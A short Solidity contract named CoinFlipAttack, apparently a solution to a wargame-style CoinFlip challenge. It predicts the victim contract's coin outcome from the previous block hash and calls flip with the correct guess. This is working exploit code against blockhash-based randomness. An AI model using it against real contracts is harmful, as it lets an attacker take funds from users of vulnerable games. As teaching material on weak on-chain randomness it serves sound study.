// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { CoinFlip } from "./CoinFlip.sol";
contract CoinFlipAttack {
    uint256 public consecutiveWins;
    uint256 lastHash;
    CoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victim) {
        victim = CoinFlip(_victim);
    }

    function attack() public{
         uint256 blockValue = uint256(blockhash(block.number - 1));

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);

    }

}